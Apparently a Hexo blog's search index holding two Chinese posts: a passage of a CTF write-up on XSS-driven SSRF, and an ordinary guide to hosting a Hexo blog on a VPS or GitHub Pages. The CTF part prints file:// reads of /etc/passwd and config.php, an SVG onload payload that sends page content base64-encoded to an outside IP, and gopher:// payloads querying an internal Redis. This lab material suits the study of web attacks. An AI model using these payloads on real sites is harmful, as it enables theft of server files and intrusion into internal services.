class="hljs-string">&quot;logout.php&quot;</span>&gt;Logout&lt;/a&gt;    &lt;/li&gt;  &lt;/ul&gt;&lt;/nav&gt;    &lt;<span class="hljs-keyword">div</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;      &lt;pre&gt;&lt;code&gt;root:x:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:root:<span class="hljs-regexp">/root:/</span>bin/bashdaemon:x:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:daemon:<span class="hljs-regexp">/usr/</span>sbin:<span class="hljs-regexp">/usr/</span>sbin/nologinbin:x:<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:bin:<span class="hljs-regexp">/bin:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologinsys:x:<span class="hljs-number">3</span>:<span class="hljs-number">3</span>:sys:<span class="hljs-regexp">/dev:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologinsync:x:<span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:sync:<span class="hljs-regexp">/bin:/</span>bin/syncgames:x:<span class="hljs-number">5</span>:<span class="hljs-number">60</span>:games:<span class="hljs-regexp">/usr/g</span>ames:<span class="hljs-regexp">/usr/</span>sbin/nologinman:x:<span class="hljs-number">6</span>:<span class="hljs-number">12</span>:man:<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/man:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologinlp:x:<span class="hljs-number">7</span>:<span class="hljs-number">7</span>:lp:<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/lpd:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologinmail:x:<span class="hljs-number">8</span>:<span class="hljs-number">8</span>:mail:<span class="hljs-regexp">/var/m</span>ail:<span class="hljs-regexp">/usr/</span>sbin/nologinnews:x:<span class="hljs-number">9</span>:<span class="hljs-number">9</span>:news:<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/news:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologinuucp:x:<span class="hljs-number">10</span>:<span class="hljs-number">10</span>:uucp:<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/uucp:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologinproxy:x:<span class="hljs-number">13</span>:<span class="hljs-number">13</span>:proxy:<span class="hljs-regexp">/bin:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologinwww-data:x:<span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www-data:<span class="hljs-regexp">/var/</span>www:<span class="hljs-regexp">/usr/</span>sbin/nologinbackup:x:<span class="hljs-number">34</span>:<span class="hljs-number">34</span>:backup:<span class="hljs-regexp">/var/</span>backups:<span class="hljs-regexp">/usr/</span>sbin/nologinlist:x:<span class="hljs-number">38</span>:<span class="hljs-number">38</span>:Mailing List Manager:<span class="hljs-regexp">/var/</span>list:<span class="hljs-regexp">/usr/</span>sbin/nologinirc:x:<span class="hljs-number">39</span>:<span class="hljs-number">39</span>:ircd:<span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/ircd:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologingnats:x:<span class="hljs-number">41</span>:<span class="hljs-number">41</span>:Gnats Bug-Reporting System (admin):<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gnats:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologinnobody:x:<span class="hljs-number">65534</span>:<span class="hljs-number">65534</span>:nobody:<span class="hljs-regexp">/nonexistent:/u</span>sr<span class="hljs-regexp">/sbin/</span>nologinsystemd-timesync:x:<span class="hljs-number">100</span>:<span class="hljs-number">102</span>:systemd Time Synchronization,,,:<span class="hljs-regexp">/run/</span>systemd:<span class="hljs-regexp">/bin/</span><span class="hljs-keyword">false</span>systemd-network:x:<span class="hljs-number">101</span>:<span class="hljs-number">103</span>:systemd Network Management,,,:<span class="hljs-regexp">/run/</span>systemd<span class="hljs-regexp">/netif:/</span>bin/<span class="hljs-keyword">false</span>systemd-resolve:x:<span class="hljs-number">102</span>:<span class="hljs-number">104</span>:systemd Resolver,,,:<span class="hljs-regexp">/run/</span>systemd<span class="hljs-regexp">/resolve:/</span>bin/<span class="hljs-keyword">false</span>systemd-bus-proxy:x:<span class="hljs-number">103</span>:<span class="hljs-number">105</span>:systemd Bus Proxy,,,:<span class="hljs-regexp">/run/</span>systemd:<span class="hljs-regexp">/bin/</span><span class="hljs-keyword">false</span>_apt:x:<span class="hljs-number">104</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/nonexistent:/</span>bin/<span class="hljs-keyword">false</span>messagebus:x:<span class="hljs-number">105</span>:<span class="hljs-number">107</span>::<span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/dbus:/</span>bin/<span class="hljs-keyword">false</span>mysql:x:<span class="hljs-number">106</span>:<span class="hljs-number">108</span>:MySQL Server,,,:<span class="hljs-regexp">/nonexistent:/</span>bin/<span class="hljs-keyword">false</span>redis:x:<span class="hljs-number">107</span>:<span class="hljs-number">110</span>::<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/redis:/</span>bin/<span class="hljs-keyword">false</span>&lt;<span class="hljs-regexp">/code&gt;&lt;/</span>pre&gt;      &lt;form action=<span class="hljs-string">&quot;/request.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;        &lt;<span class="hljs-keyword">div</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;          &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;URL&lt;/label&gt;          &lt;textarea name=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> id=<span class="hljs-string">&quot;url&quot;</span> aria-describedby=<span class="hljs-string">&quot;url&quot;</span> placeholder=<span class="hljs-string">&quot;URL&quot;</span> rows=<span class="hljs-string">&quot;10&quot;</span>&gt;<span class="hljs-keyword">file</span>:<span class="hljs-comment">///etc/passwd</span></code></pre><p>猜目录：</p><pre><code class="hljs awk">Apache <span class="hljs-regexp">/var/</span>wwww/htmlNginx <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html</code></pre><p>读取config.php</p><pre><code class="hljs nix">&lt;svg/<span class="hljs-attr">onload=&quot;</span><span class="hljs-attr">xmlhttp=new</span> XMLHttpRequest();xmlhttp.<span class="hljs-attr">onreadystatechange=function()</span>&#123;    <span class="hljs-keyword">if</span> (xmlhttp.<span class="hljs-attr">readyState==4</span> &amp;&amp; xmlhttp.<span class="hljs-attr">status==200)</span>    &#123; document.<span class="hljs-attr">location=&#x27;http://45.77.135.182:80/?&#x27;+btoa(xmlhttp.responseText);</span>    &#125;&#125;xmlhttp.open(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;request.php&quot;</span>,<span class="hljs-literal">true</span>);xmlhttp.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);xmlhttp.send(<span class="hljs-string">&quot;url=file:///var/www/html/config.php&quot;</span>);<span class="hljs-string">&quot;&gt;</span></code></pre><p>获得flag！</p><h3 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a>xssrf redis</h3><p>gopher未授权访问打redis</p><pre><code class="hljs nix">&lt;svg/<span class="hljs-attr">onload=&quot;</span><span class="hljs-attr">xmlhttp=new</span> XMLHttpRequest();xmlhttp.<span class="hljs-attr">onreadystatechange=function()</span>&#123;    <span class="hljs-keyword">if</span> (xmlhttp.<span class="hljs-attr">readyState==4</span> &amp;&amp; xmlhttp.<span class="hljs-attr">status==200)</span>    &#123;        document.<span class="hljs-attr">location=&#x27;http://45.77.135.182:80/?&#x27;+btoa(xmlhttp.responseText);</span>    &#125;&#125;xmlhttp.open(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;request.php&quot;</span>,<span class="hljs-literal">true</span>);xmlhttp.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);xmlhttp.send(<span class="hljs-string">&quot;url=gopher://127.0.0.1:25566/_info%250a_quit&quot;</span>);</code></pre><pre><code class="hljs awk">xmlhttp.send(<span class="hljs-string">&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*&quot;</span>);<span class="hljs-regexp">//</span>读键值</code></pre><pre><code class="hljs perl">xmlhttp.send(<span class="hljs-string">&quot;url=gopher://127.0.0.1:25566/_get%2520flag%250a_quit&quot;</span>);</code></pre><pre><code class="hljs perl">xmlhttp.send(<span class="hljs-string">&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a_quit&quot;</span>);</code></pre><pre><code class="hljs perl">xmlhttp.send(<span class="hljs-string">&quot;url=gopher://127.0.0.1:25566/_llen%2520flag%250a_quit&quot;</span>);</code></pre><pre><code class="hljs perl">xmlhttp.send(<span class="hljs-string">&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;</span>);</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客搭建笔记</title>
    <link href="/2020/04/06/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/04/06/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p> 简单记录hexo博客的两次搭建过程                                                                        </p><p>​    <a id="more"></a>                                                                                                        </p><h3 id="1-hexo-vps服务器"><a href="#1-hexo-vps服务器" class="headerlink" title="1. hexo+vps服务器"></a>1. hexo+vps服务器</h3><h4 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h4><p>win10</p><p>vultr上买的centos7（部署服务器用</p><p>hexo 4.2.0</p><h4 id="博客搭建："><a href="#博客搭建：" class="headerlink" title="博客搭建："></a>博客搭建：</h4><p>下载nodeJS安装包,地址：<a href="http://nodejs.cn/">http://nodejs.cn/</a></p><p>安装Git</p><p>新建文件夹，shift+右键打开powershell窗口，</p><pre><code class="hljs avrasm">npm install hexo-<span class="hljs-keyword">cli</span> -g</code></pre><p>全局安装hexo-cli脚手架工具</p><p>（-g 全局安装的包直接安装到计算机中，只需安装一次，以后在计算机的任何位置都可以使用这个包</p><p>在powershell窗口中接着初始化hexo</p><pre><code class="hljs csharp">hexo <span class="hljs-keyword">init</span></code></pre><p>安装相关依赖插件：</p><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span></code></pre><p>在theme文件夹中有一个自带的landscape主题，但我们可以另外选择主题，下载好后放到theme文件夹下，并打开博客的<strong>根目录</strong>里“_config.yml”文件，找到theme属性值，替换为新的主题的文件夹名称即可</p><p>根目录下“_config.yml”文件的配置可以通过这篇文章了解：</p><p><a href="https://blog.csdn.net/zemprogram/article/details/104288872?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2">https://blog.csdn.net/zemprogram/article/details/104288872?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2</a></p><p>主题的详细配置可以在<strong>该主题目录下</strong>“_config.yml”文件里修改配置</p><p>通过以下命令可以</p><p>清除缓存</p><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span></code></pre><p>重新生成静态博客文件：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g</span></code></pre><p>开启本地预览服务：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span></code></pre><p>然后就可以在浏览器中通过地址“<a href="http://localhost:4000/%E2%80%9D%E6%9D%A5%E8%AE%BF%E9%97%AE%E5%8D%9A%E5%AE%A2%E4%BA%86">http://localhost:4000/”来访问博客了</a></p><p>ctrl+C可以关闭博客,关闭后可以修改配置，再次启动就可以看到变化</p><h4 id="写文章："><a href="#写文章：" class="headerlink" title="写文章："></a>写文章：</h4><p>新建文章</p><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type"></span>‘<span class="hljs-number">1</span>’</code></pre><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span></code></pre><p>启动后本地访问就可以看见多了一篇名为‘1’的博客啦</p><p>同时在 source  下的  _posts 中也可以看见多出了“1.md”的文件，只需要在md文件中对文件内容进行修改，刷新网页后就能看到修改后的博客</p><p>也可以把写好的md文件移到_posts 中，刷新网页可以看到新的博客</p><p>将md文件删除会删除此博客</p><h4 id="部署到服务器："><a href="#部署到服务器：" class="headerlink" title="部署到服务器："></a>部署到服务器：</h4><h5 id="vps服务器"><a href="#vps服务器" class="headerlink" title="vps服务器"></a>vps服务器</h5><p>需要先购买一台vps主机</p><p>检查IP是否被墙：</p><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p>如端口“22”显示红色“开放”状态，则IP可用</p><h5 id="vps上安装nginx与git"><a href="#vps上安装nginx与git" class="headerlink" title="vps上安装nginx与git"></a>vps上安装nginx与git</h5><p>打开xshell6，连接vps服务器，开始安装nginx</p><p>在xshell中</p><p>先更新</p><pre><code class="hljs ebnf"><span class="hljs-attribute">yum -y update</span></code></pre><p>安装git和nginx</p><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> -y git nginx</code></pre><p>如果报错：No package nginx available</p><p>安装epel后可以解决</p><pre><code class="hljs sql">yum <span class="hljs-keyword">install</span> epel-<span class="hljs-keyword">release</span></code></pre><h5 id="验证nginx是否配置成功"><a href="#验证nginx是否配置成功" class="headerlink" title="验证nginx是否配置成功"></a>验证nginx是否配置成功</h5><p>可以新建一个html文件，能够显示：Nginx running作为标记来验证nginx配置成功</p><p>xshell6中用以下方式，创建博客目录，修改文件权限：</p><pre><code class="hljs haskell"><span class="hljs-title">mkdir</span> /<span class="hljs-class"><span class="hljs-keyword">data</span></span><span class="hljs-title">cd</span> /<span class="hljs-class"><span class="hljs-keyword">data</span></span><span class="hljs-title">mkdir</span> www<span class="hljs-title">cd</span> www<span class="hljs-title">mkdir</span> hexo<span class="hljs-title">chmod</span> -<span class="hljs-type">R</span> <span class="hljs-number">755</span> /<span class="hljs-class"><span class="hljs-keyword">data</span>/www/hexo</span></code></pre><p>新建html文件</p><pre><code class="hljs awk">vi  <span class="hljs-regexp">/data/</span>www<span class="hljs-regexp">/hexo/i</span>ndex.html</code></pre><p>新建文件的方法：vi  路径</p><p>如果有提示文件已经存在，按住方向键向下到提示底部，再按任意键可以进入命令模式</p><p>用vi打开文件后，先进入命令模式。按i/o可以进入编辑模式，esc退出到命令模式，：wq可以保存并退出</p><p>vi命令详解：<a href="https://blog.csdn.net/cyl101816/article/details/82026678">https://blog.csdn.net/cyl101816/article/details/82026678</a></p><p>可以插入内容如下：</p><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Nginx running<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>保存退出</p><h5 id="编辑nginx-conf文件"><a href="#编辑nginx-conf文件" class="headerlink" title="编辑nginx.conf文件"></a>编辑nginx.conf文件</h5><p>xshell6使用以下命令配置nginx服务器：</p><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>nginx/nginx.conf</code></pre><p>修改以下三项：</p><p>user改为root</p><p>server中的server_name改成vps的ip地址或自己的域名，多个域名/ip可以用一个空格间隔开</p><p>root修改为hexo博客文件存放的目录（刚刚的验证html文件也放这里了），即</p><pre><code class="hljs awk"><span class="hljs-regexp">/data/</span>www<span class="hljs-regexp">/hexo/</span></code></pre><p>配置后保存退出</p><p>重启nginx：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart nginx</span></code></pre><p>nginx服务器配置详细可以参考这篇文章：</p><p><a href="https://www.jianshu.com/p/5d6bd48b4c2f">https://www.jianshu.com/p/5d6bd48b4c2f</a></p><p>检查nginx服务器配置是否正确：</p><pre><code class="hljs awk">sudo nginx -t -c <span class="hljs-regexp">/etc/</span>nginx/nginx.conf</code></pre><p>结尾有success说明配置成功</p><p>ps：fail有可能因为语法错误，注意<code>;</code>或<code>&#125;</code>是否不小心删掉了</p><p>重启nginx：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart nginx</span></code></pre><p>访问域名或ip，可以看见“nginx running”，说明nginx配置成功，如果没有成功，请阅读“端口”</p><h5 id="端口："><a href="#端口：" class="headerlink" title="端口："></a>端口：</h5><p>nginx默认的端口是80，但是发现购买的主机上80端口没有开放</p><p>开放80端口：</p><pre><code class="hljs routeros">firewall-cmd <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=80/tcp --permanent</code></pre><h5 id="创建git仓库"><a href="#创建git仓库" class="headerlink" title="创建git仓库"></a>创建git仓库</h5><pre><code class="hljs haskell"><span class="hljs-title">mkdir</span> /<span class="hljs-class"><span class="hljs-keyword">data</span>/<span class="hljs-type">GitLibrary</span></span><span class="hljs-title">chmod</span> -<span class="hljs-type">R</span> <span class="hljs-number">755</span> /<span class="hljs-class"><span class="hljs-keyword">data</span>/<span class="hljs-type">GitLibrary</span></span><span class="hljs-title">cd</span> /<span class="hljs-class"><span class="hljs-keyword">data</span>/<span class="hljs-type">GitLibrary</span></span><span class="hljs-title">git</span> init <span class="hljs-comment">--bare hexo.git</span></code></pre><p>创建git钩子：</p><pre><code class="hljs awk">vim <span class="hljs-regexp">/data/</span>GitLibrary<span class="hljs-regexp">/hexo.git/</span>hooks/post-receive</code></pre><p>增加内容：</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span>git --work-tree=/data/www/hexo --git-dir=/data/GitLibrary/hexo.git checkout -f</code></pre><pre><code class="hljs awk">chmod +x <span class="hljs-regexp">/data/</span>GitLibrary<span class="hljs-regexp">/hexo.git/</span>hooks/post-receive</code></pre><p>来源：<a href="https://blog.csdn.net/qq_35117024/article/details/104021260?utm_source=app">https://blog.csdn.net/qq_35117024/article/details/104021260?utm_source=app</a></p><p>步骤3.7~3.10</p><h5 id="配置根目录下-config-yml"><a href="#配置根目录下-config-yml" class="headerlink" title="配置根目录下_config.yml"></a>配置根目录下_config.yml</h5><p>最底部的deploy信息：</p><p>注意type、repository、branch后的冒号后有一个空格，其它没有</p><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><span class="hljs-symbol">  type:</span> git<span class="hljs-symbol">  repository:</span> root@<span class="hljs-meta">###:/data/GitLibrary/hexo     <span class="hljs-comment">//###为域名或ip地址</span></span><span class="hljs-symbol">  branch:</span> master</code></pre><h5 id="博客推送到服务器"><a href="#博客推送到服务器" class="headerlink" title="博客推送到服务器"></a>博客推送到服务器</h5><p>本地powershell或git输入：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo d</span></code></pre><p>把博客推送到服务器</p><p>如果失败，可能是repository填写有非法字符，或者还没安装插件：</p><p>用git：</p><pre><code class="hljs sql">npm <span class="hljs-keyword">install</span> hexo-deployer-git <span class="hljs-comment">--save  </span></code></pre><p>成功推送后，通过域名或ip地址可以访问博客</p><p>搭建博客完成</p><p>参考文章：<a href="https://blog.csdn.net/qq_35117024/article/details/104021260?utm_source=app">https://blog.csdn.net/qq_35117024/article/details/104021260?utm_source=app</a></p><h3 id="2-hexo-github"><a href="#2-hexo-github" class="headerlink" title="2. hexo+github"></a>2. hexo+github</h3><p>很多步骤前面都搞过了，这次就简单地写一下吧</p><p>1.创建一个github账号</p><p>2.安装git</p><p>3.安装node.js</p><p>4.安装npm</p><p>5.在github上新建一个名为<code>你的用户名.github.io</code>的仓库</p><p>6.配置ssh key</p><p>7.安装配置hexo</p><p>8.在上传代码到github之前，一定要记得先把你以前所有代码下载下来（虽然github有版本管理，但备份一下总是好的），因为从hexo提交代码时会把你以前的所有代码都删掉</p><p>9.根目录下_config.yml   deploy配置</p><p>deploy:<br>  type: git<br>  repository: <a href="mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#46;&#99;&#x6f;&#109;">&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#46;&#99;&#x6f;&#109;</a>:atsap0/atsap0.github.io.git<br>  branch: master</p><p>repo不能写成</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/atsap0/</span>atsap0.github.io.git</code></pre><p>的形式，这是hexo2.x的写法</p><p>10.hexo d</p><p>博客搭建完成</p><p>参考文章：<a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html</a></p><p>使用github+hexo的方法简单容易上手，也不用花钱，网上有大量的教程，遇到问题比较容易解决,不过也有加载时间长的缺点（现在github.io好像要翻墙才行</p><p>用自己的服务器搭的过程比较麻烦，过程中碰到了一些的坑，本来以为半天就差不多能完成，结果做了整整两天 ，<del>是我不配拥有博客吗</del>，后来用github搭就很快了~</p>]]></content>
    
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
